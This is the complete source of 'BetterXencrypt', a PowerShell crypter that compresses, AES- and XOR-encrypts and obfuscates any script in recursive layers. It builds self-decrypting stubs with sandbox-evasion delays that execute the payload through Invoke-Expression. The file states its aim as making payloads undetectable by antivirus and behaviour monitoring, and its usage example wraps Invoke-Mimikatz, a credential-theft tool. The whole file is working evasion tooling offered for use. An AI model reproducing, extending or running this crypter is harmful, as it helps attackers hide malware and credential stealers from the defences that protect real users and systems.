# Xentropy's Copyright
#    Xencrypt - PowerShell crypter
#    Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
# GetRektBoy724's Copyright
#    BetterXencrypt - PowerShell crypter
#    Copyright (C) 2021 GetRektBoy724
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {
        #Variable length help vary the length of the file generated
        #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
        $set = "abcdefghijkmnopqrstuvwxyz"
        (1..(10 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 6 -Maximum $set.Length)] } ) -join ''
}

function xorEnc {
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $string = $(Throw("oopsie doopsie we made a fucky wucky shit")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $method = $(Throw("oopsie doopsie we made a fucky wucky shit")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $key = $(Throw("oopsie doopsie we made a fucky wucky shit"))
    )
    $xorkey = [System.Text.Encoding]::UTF8.GetBytes($key)

    if ($method -eq "decrypt"){
        $string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($string))
    }

    $byteString = [System.Text.Encoding]::UTF8.GetBytes($string)
    $xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
        for ($j = 0; $j -lt $xorkey.length; $j++) {
            $byteString[$i] -bxor $xorkey[$j]
            $i++
            if ($i -ge $byteString.Length) {
                $j = $xorkey.length
            }
        }
    })

    if ($method -eq "encrypt") {
        $xordData = [System.Convert]::ToBase64String($xordData)
    } else {
        $xordData = [System.Text.Encoding]::UTF8.GetString($xordData)
    }
    
    return $xordData
}

function Invoke-BetterXencrypt {
    <#
    .SYNOPSIS
    Invoke-BetterXencrypt is a better version of Xencrypt,Xencrypt itself is a Powershell runtime crypter designed to evade AVs,cause Xencrypt is not FUD anymore,i recode the stub and "big bang boom",voila!Its FUD again
    If you dont know what Xencrypt is,Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.
    .DESCRIPTION
     ____       _   _          __  __                                _   
    | __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_ 
    |  _ \ / _ \ __| __/ _ \ '__\  // _ \ '_ \ / __| '__| | | | '_ \| __|
    | |_) |  __/ |_| ||  __/ |  /  \  __/ | | | (__| |  | |_| | |_) | |_ 
    |____/ \___|\__|\__\___|_| /_/\_\___|_| |_|\___|_|   \__, | .__/ \__|
                                                         |___/|_|       
    ----------------------------------------------------------------------
    [-----------------Your Lovely FUD Powershell Crypter-----------------]
    [-----------------Recoded With Love By GetRektBoy724-----------------]
    [------------------https://github.com/GetRektBoy724------------------]
     Invoke-BetterXencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
     Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs.
     Invoke-BetterXencrypt uses AES and XOR encryption with GZip/Deflate compression.
     Version : v1.4.0
    .PARAMETER InFile
    Specifies the script to encrypt.
    .PARAMETER OutFile
    Specifies the output script.
    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 2.
    .EXAMPLE
    PS> Invoke-BetterXencrypt -InFile Invoke-Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3
    .LINK
    https://github.com/GetRektBoy724/BetterXencrypt
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 2
    )
    Process {
        # a good tool need a good banner ;)
        $banner = @"
 ____       _   _          __  __                                _   
| __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_ 
|  _ \ / _ \ __| __/ _ \ '__\  // _ \ '_ \ / __| '__| | | | '_ \| __|
| |_) |  __/ |_| ||  __/ |  /  \  __/ | | | (__| |  | |_| | |_) | |_ 
|____/ \___|\__|\__\___|_| /_/\_\___|_| |_|\___|_|   \__, | .__/ \__|
                                                     |___/|_|       
----------------------------------------------------------------------
[-----------------Your Lovely FUD Powershell Crypter-----------------]
[-----------------Recoded With Love By GetRektBoy724-----------------]
[------------------https://github.com/GetRektBoy724------------------]
"@
        Write-Output "$banner"
        # read
        Write-Output "[*] Reading '$($infile)' ..."
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            # Decide on encryption params ahead of time 
            
            Write-Output "[*] Starting code layer  ..."
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'ECB','CBC'
            $ciphermode = $ciphermodes | Get-Random

            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random

            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Output "[*] Compressing ..."
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
            $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Output "[*] Generating encryption key ..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }

            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Output "[*] Encrypting with AES..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)

            #reverse base64 encrypted for obfuscation ;)
            $reversingb64encrypted = $b64encrypted.ToCharArray()
            [array]::Reverse($reversingb64encrypted)
            $b64encryptedreversed = -join($reversingb64encrypted)
        
            # xor encrypt
            Write-Output "[*] Encrypting with XOR ..."
            # this is a literal fucking hell,i need to fucking set variable names for the goddang xor encryptor/decryptor at the stub
            $string = Create-Var
            $method = Create-Var
            $key = Create-Var
            $byteString = Create-Var
            $xordData = Create-Var
            $xori = Create-Var
            $xorj = Create-Var
            # now its the time to XOR encrypt the reversed AES encrypted payload
            $XOREncKey = Create-Var
            $base64XOREncPayload = xorEnc -string "$b64encryptedreversed" -method "encrypt" -key "$XOREncKey"

            # write
            Write-Output "[*] Finalizing code layer ..."

            $stub_template = ''

            # some AV's Dynamic Analysis bypasses
            $code_alternatives  = @()
            $code_alternatives += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet";Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
            $code_alternatives += 'if (${30} -lt 250) {17} ${31} = "a" * 300MB {18}' + "`r`n"
            $code_alternatives += '${19} = 0' + "`r`n"
            $code_alternatives += '${20} = 30000000' + "`r`n" 
            $code_alternatives += 'For (${19}=0; ${19} -lt ${20};${19}++) {17} ${19}++ {18}' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${43} = [System.Text.Encoding]::UTF8.GetBytes("{42}")' + "`r`n"
            $code_alternatives += '${44} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{0}"))' + "`r`n"
            $code_alternatives += '${45} = [System.Text.Encoding]::UTF8.GetBytes(${44})' + "`r`n"
            # start XOR decrypt sequence
            $code_alternatives += '${46} = $(for (${47} = 0; ${47} -lt ${45}.length; ) {17}' + "`r`n"
            $code_alternatives += '    for (${48} = 0; ${48} -lt ${43}.length; ${48}++) {17}' + "`r`n"
            $code_alternatives += '        ${45}[${47}] -bxor ${43}[${48}]' + "`r`n"
            $code_alternatives += '        ${47}++' + "`r`n"
            $code_alternatives += '        if (${47} -ge ${45}.Length) {17}' + "`r`n"
            $code_alternatives += '            ${48} = ${43}.length' + "`r`n"
            $code_alternatives += '        {18}' + "`r`n"
            $code_alternatives += '    {18}' + "`r`n"
            $code_alternatives += '{18})' + "`r`n"
            $code_alternatives += '${46} = [System.Text.Encoding]::UTF8.GetString(${46})' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${11} = "${46}"' + "`r`n"
            $code_alternatives += '${9} = ${11}.ToCharArray()' + "`r`n"
            $code_alternatives += '[array]::Reverse(${9})' + "`r`n"
            $code_alternatives += '${10} = -join(${9})' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${2} = [System.Convert]::FromBase64String("${10}")' + "`r`n"
            $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
            #aes managed but its base64 encoded and reversed ;)
            $code_alternatives += '${24} = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"'  + "`r`n"
            $code_alternatives += '${25} = ${24}.ToCharArray()'  + "`r`n"
            $code_alternatives += '[array]::Reverse(${25})'  + "`r`n"
            $code_alternatives += '${26} = -join(${25})'  + "`r`n"
            $code_alternatives += '${12} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${26}))' + "`r`n"
            $code_alternatives += '${4} = New-Object "${12}"' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            #ciphermode but its base64 encoded and reversed ;)
            if ($ciphermode -eq "ECB") {
                $code_alternatives += '${21} = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
                $code_alternatives += '[array]::Reverse(${23})' + "`r`n"
                $code_alternatives += '${22} = -join(${23})' + "`r`n"
                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${22}))' + "`r`n"
                $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
            }elseif ($ciphermode -eq "CBC") {
                $code_alternatives += '${21} = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
                $code_alternatives += '[array]::Reverse(${23})' + "`r`n"
                $code_alternatives += '${22} = -join(${23})' + "`r`n"
                $code_alternatives += '${13} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${22}))' + "`r`n"
                $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
            }
            #paddingmode but its base64 encoded and reversed ;)
            if ($paddingmode -eq 'PKCS7') {
                $code_alternatives += '${27} = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ISO10126') {
                $code_alternatives += '${27} = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"                
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ANSIX923') {
                $code_alternatives += '${27} = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"    
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'Zeros') {
                $code_alternatives += '${27} = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${29}))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            }
            $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
            $code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${34} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))' + "`r`n"
            $code_alternatives += '${6} = New-Object ${34}(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
            $code_alternatives += '${7} = New-Object ${34}' + "`r`n"
            $stub_template += $code_alternatives -join ''


            if ($compressiontype -eq "Gzip") {
                $stub_template += '${40} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))' + "`r`n"
                $stub_template += '${41} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))'    + "`r`n"
                $stub_template += '${5} = New-Object ${35} ${6}, (${41}::${40})'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${40} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))' + "`r`n"
                $stub_template += '${41} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))'    + "`r`n"
                $stub_template += '${5} = New-Object ${35} ${6}, (${41}::${40})'    + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"

            $code_alternatives  = @()
            $code_alternatives += '${5}.Close()' + "`r`n"
            $code_alternatives += '${4}.Dispose()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${36} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
            $code_alternatives += '${37} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
            $code_alternatives += '${38} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
            $code_alternatives += '${39} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
            $code_alternatives += '${8} = ${36}::${37}.${39}(${7}.${38}())' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
            
        
            # it's ugly, but it beats concatenating each value manually.
            [string]$code = $stub_template -f $base64XOREncPayload, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), $XOREncKey, $key, $string, $byteString, $xordData, $xori, $xorj
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Output "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Output "[+] Done!"
    }
}
